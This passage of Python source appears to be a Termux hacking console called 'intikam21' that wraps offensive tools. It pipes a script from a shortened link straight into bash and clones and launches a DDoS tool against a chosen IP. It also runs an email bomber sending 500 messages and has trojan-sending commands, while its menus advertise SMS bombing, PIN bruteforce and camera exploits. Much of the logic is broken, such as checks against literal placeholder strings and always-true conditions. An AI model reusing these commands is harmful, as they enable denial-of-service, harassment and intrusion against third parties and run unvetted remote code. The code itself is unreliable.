					print(Fore.GREEN + "setting whoami" + Fore.RESET)
					# Sistemin kullanıcı adını alma
					username = getpass.getuser()
					# Sistemin platform bilgisini alma
					platform_info = platform.system()
					print("ami:: " + Fore.GREEN + username)
				if set_name == "neofetch":
					os.system("python neofetch.py")
				if set_name == "job":
					print("creating job!")
					def job():
						if '-' not in help_input:
							print("please use arguments")
						if '-a "{name}"' or '--a "{name}' in help_input:
							global name
							global job
							job = ["Hacker", "Cyber Securitier", "Social Engineer", "Malware Analyser", "Web Hacking Engineer", "Team Leader"]

							if name not in job:
								print("Please, list in job")
							if name in job:
								print("cloning job...")
								t.sleep(2)
								if not job:
									job = True
							print("added job : "+ job)
						if help_input in '-e {job}' or '--exit {job}':
								def rm_job():
									job = rm_job
									print("removed job/ removeded job: " + job)
								rm_job()
	if help_input == "job":
		job = job()
		job
	if help_input == "mode-'{mode_name}'":
		global mode_name
		mode_name = ["admin", "normal", "spectator"]
		if mode_name == "admin":
				print("you are admin mode :)")
				os.system("clear")
				banner()
				admin_input = input("""
		┌──(intikam21-cyber@root[admin]
		└─$""")
				if admin_input == "set -a admin$Off":
					print("adding set")
					t.sleep(2)
					print("offed a set$ADMİN")
					break
					exit()
					os.system("intconsole")
				if admin_input == "set -a admin$Name '{user_name}'":
					print("Now you are name is: "+user_name)
				if admin_input == "set -a admin$WHOAMİ":
					print(whoami)
				if admin_input == "set -a admin$RAUNT {name} {command}":
					os.system("touch "+name)
					os.system("nano "+name)
					os.system(command)
					os.system("source "+name)
				if admin_input == "set -a admin$HELP":
					print(list)
				if admin_input == "set -a admin$RASSN":
					print("RAT SET SELECT NOTEPAD")
					os.system("introjan -h")
				if admin_input == "use {u_name}":
					if u_name == "Cage-FRAMEWORK":
						os.system("bash <(wget -qO- https://bit.ly/3ilzOl9)")
						os.system("git clone https://github.com/xzendercage/cageframework")
						os.system("cd cageframework")
						os.system("python cageframework.py")
					if u_name == "On-The-Go-FRAMEWORK":
						os.system("git clone https://github.com/Aoshee/onTHEgo")
						os.system("cd onTHEgo")
						os.system("pip install -r REQUIREMENTS")
						os.system("python onTHEgo.py")
					if u_name == "Zkit-FRAMEWORK":
						os.system("git clone git clone https://github.com/000Zer000/ZKit-Framework")
						os.system("cd Zkit-Framework")
						os.system("pip install -r requirements.txt")
					if u_name == "RecoTak-FRAMEWORK":
						os.system("git clone https://github.com/recotak/recotak-framework.git && cd recotak && sh install.sh")
					if u_name == "Osint-FRAMEWORK":
						os.system("""
						git clone https://github.com/TermuxHackz/X-osint
						cd X-osint
						#3) Grant permissions and run install file
						chmod +x *
						bash setup.sh
						""")
					if u_name == "Katana-Framework" or "Katana-FRAMEWORK":
						os.system("""
						git clone https://github.com/PowerScript/KatanaFramework.git
						cd KatanaFramework
						sh dependencies
						python install
						""")
					if u_name == "Hunner-Framework" or "Hunner-FRAMEWORK":
						os.system("git clone https://github.com/b3-v3r/Hunner")
						os.system("cd Hunner")
						os.system("python3 hunner.py")
					if u_name == "metasploit-framework" or "Metasploit-Framework" or "Metasploit-FRAMEWORK":
						os.system("msfconsole")
					else:
						os.system("pkg update -y && pkg upgrade -y && apt update -y && apt upgrade -y")
						os.system("pkg install wget -y")
						os.system("wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh")
						os.system("chmod +x metasploit.sh")
						os.system("./metasploit.sh")
					if u_name == "intikam21-framework" or "İntikam21-Framework" or "intikam21-FRAMEWORK" or "İNTİKAM21-FRAMEWORK":
						exit()
						os.system("intconsole")
					else:
						os.system("""
						cd ~
						rm -rf intframework
						git clone https://github.com/Intikam21kurucu/intframework
						cd intframework
						chmod +x terbuild.sh
						./terbuild.sh
						""")
				if admin_input == "exit":
					exit()
		if mode_name == "normal":
			exit()
			os.system("intconsole")
		if mode_name == "spectator":
			exit()
	if help_input == "connect {ip}":
		c = help_input[8:]
		global ip_
		ip_ = []
		if '-ip' not in help_input:
			print("please ip -ip")
		if help_input in ip:
			print("saved ip")
		if '-ip {ip_}' in help_input:
			print("ip:" + ip_)
		if '-p' in help_input:
			print("pinging...")
			os.system("ping "+ip_)
		if '-l' in help_input:
			HOST = ip_
			PORT = 5555
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.bind((HOST, PORT))
			print('Socket bind complete')
			s.listen(10)
			conn, addr = s.accept()
			print('Connected with ' + addr[0] + ':' + str(addr[1]))
		if "-e" in help_input:
			exit()
	
		
		print("command help for using : com-help")
	global int_packages
	int_packages = ["git", "pwd", "neofetch", "mode-ninja", "aichat", "int-DoShAcK", "int-intformations", ""]
	if help_input == "int install {package_nama}":
		global package_nama
		global installed_package
		installed_package = None
		if package_nama in int_packages == "git":
			print("Get 1:https://github.com/termux/termux-packages/ ")
			os.system("wget https://github.com/termux/termux-packages/blob/master/packages%2Fgit%2Fbuild.sh")
			os.system("""
			wget https://github.com/termux/termux-packages/blob/master/packages/cloneit/build.sh
			wget https://github.com/termux/termux-packages/blob/master/packages/git/config.c.patch
			wget https://github.com/termux/termux-packages/blob/master/packages/git/config.mak.uname.patch
			wget https://github.com/termux/termux-packages/blob/master/packages/git/disable-fdsan.patch
			wget https://github.com/termux/termux-packages/blob/master/packages/git/disable_daemon_syslog.patch
			wget https://github.com/termux/termux-packages/blob/master/packages/git/git-gitk.subpackage.sh
			wget https://github.com/termux/termux-packages/blob/master/packages/git/git-gui.subpackage.sh
			wget https://github.com/termux/termux-packages/blob/master/packages/git/git-svn.subpackage.sh
			wget https://github.com/termux/termux-packages/blob/master/packages/git/git.patch
			wget https://github.com/termux/termux-packages/blob/master/packages/git/help.c.patch
			wget https://github.com/termux/termux-packages/blob/master/packages/git/run-command.c.patch
			wget https://github.com/termux/termux-packages/blob/master/packages/git/tempfile.c.patch			
			""")
			installed_package = "yes"
			print("installed_package = ""yes"" ")
		if installed_package == "yes" and package_nama == "git":
			print("git is installed")
			os.system("mkdir -p git")
		if package_nama in int_packages == "mode-ninja":
			os.system("clear")
			banner()
			print("packing ninja mode")
			global slf
			slf = None 
			if s == None:
				os.system("pkg install ninja")
				os.system("pip3 install nmap") or os.system("pkg install nmap")
				os.system("pkg install xfce4")
				installed_package = "yes"
			if installed_package == "yes" and package_nama == "mode-ninja":
				print("installed package src[0]error")
				os.system("mkdir -p ninja")
			if package_nama in int_packages == "aichat":
				os.system("sh builds.sh")
				installed_package = "yes"
			else:
				print("package not found: "+package_nama)
	if help_input == "mode-ninja":
		if installed_package == "yes" and package_nama == "mode-ninja":
			while True:
				ninja = input("""┌──(intikam21-cyber@root[ninja-mode]
			└─$
			""")
				if ninja == "ninja-hack {nama_ip}":
					global nama_ip
					os.system("""
				git clone https://github.com/palahsu/DDoS-Ripper.git
				cd DDoS-Ripper
				python3 DRipper.py -s {nama_ip} -t 135""")
				if ninja == "ninja-attack {nama_email}":
					global nama_email
					os.system("""
					git clone https://github.com/zeyad-mansour/atomic-email-bomb
					cd atomic-email-bomb	
					""")
					os.system('python3 bomb.py '+ nama_email + ' 500 "subject" "body"  ')
				if ninja == "use ninja-console-start":
					print("starting ninja-console")
					while True:
						class_input = input("V3>>>")
						if class_input == "python":
							os.system("python")
						if class_input == "def {nama}()":
							os.system('python')
							os.system("def {nama}()")
						if class_input == "exit":
							exit()
							os.system("intconsole")
						if class_input == "cls free":
							print("mode is not working")
						if class_input == "srcps {namal}":
							global namal
							print("setted {namal}")
						if class_input == "tlcs set#i0#":
							print("{namal}")
							print(namal)
						if class_input == "x srcps":
							namal = None
						if class_input == "q01q":
							exit()
						if class_input == "sendtrojan to {domand}":
							global domand
							os.system("introjan -ip"+domand + '-p 90 -s "connected with your sistem" ')
				if ninja == "trojan -ip {nama_iipp} -p {nama__port} -s {nama_message}":
					os.system("introjan -ip {nama_iip} -p {nama__port} -s {nama_message}")
				if ninja == "im better":
					print("yes you are better!")
				if ninja == "bset {nama_bset}":
					global nama_bset
					print("setted "+nama_bset)
				if ninja == "shell":
					exit()
				if ninja == "listen set#i0#":
					socket.listen(nama_bset)
				if ninja == "ddos {nama_iptr}":
					global nama_iptr
					os.system("""
					git clone https://github.com/palahsu/DDoS-Ripper.git
					cd DDoS-Ripper
					""")
					os.system("pyhon3 DRipper.py -s {nama_iptr} -t 135")
				if ninja == "crf set#i0#":
					# BURAYA CRF İLE SEND YAPİLACAK
					os.system('introjan -s "'+nama_bset+'"')
					print("sended "+nama_bset)
	elif help_input == "intvenom add #set#i0## use":
		os.system("intvenom use")
	elif help_input == "intvenom add_{nama}":
		verify = input("Do you verify {nama}")
		global nama
		global verifyed
		if verify.lower() == "y":
			verifyed = "V"
			print("verifyed and connected")
			os.system('intvenom -p "'+nama+'"')
		if verify.lower() == "n":
			nama = None
			verifyed = "N"
	elif help_input == "help+intvenom":
		if verifyed == "V":
			global help_intvenom
			help_intvenom = {
			"140 Tools": """	
			140 Tools:
			1-) DDOS
			2-) SMSBOMBER
			3-DİSCORD
			4-)METASPLOİT
			5-)İNTİKAM21
			6-)iptracker
			7-)youtube-hack
			8-)Send email
			9-)OSINT Framework
	SPECİAL:	
			----------------------------------------------
			| [10]android-pin-bruteforce |
			-----------------------------------------------
		[11] bruteforce 
		[12]update
		+90 tools: [13]
		+35 tools: [intshark]
		[14]social hack
		[Oip]using oip -h
		[inTrojan] using introjan -h		
""", 
"exploits": """
		Exploits:
			[1]-Exploit Database 
			[2]-MSFVENOM
			[3]-MSFCONSOLE
			[4]-NMAP
			[5]-TRAİTOR
			[6]-facebook-id-collector			
			
			SPECİAL:
			---------------------------------------------
		   |. [7]-youtube -------- exploit    |
		   |	[8]-phonesploit	  			|
		   |	[9]-camera exploit			 |
		   |	 [10]-camexp2				   |
			---------------------------------------------	
			
			
			[11] EMAIL FINDER
			[12]-others command: intvenom
			[13]-others command: intvenom
			[14]-others command: intvenom
			[15]-others command: intvenom
			
			we are working...""", "													user": """'intvenom: 
			[16]-"""+nama
			}
		if verifyed == "N" and nama is None:
			print(Fore.RED + "Error! You are not verifyed intvenom or nama not connecting")
		else:
			print(Fore.RED + "Error! You are not verifyed intvenom or nama not connecting")
	elif help_input == "launch intvenom":
		global launched
		launched = "Y"
		os.system("""		
		rm -rf intvenom
		wget https://github.com/Intikam21kurucu/intframework/intvenom
		alias intvenom='python3 $PATH/intframework/intvenom'>>.bashrc
		intvenom -h		
		""")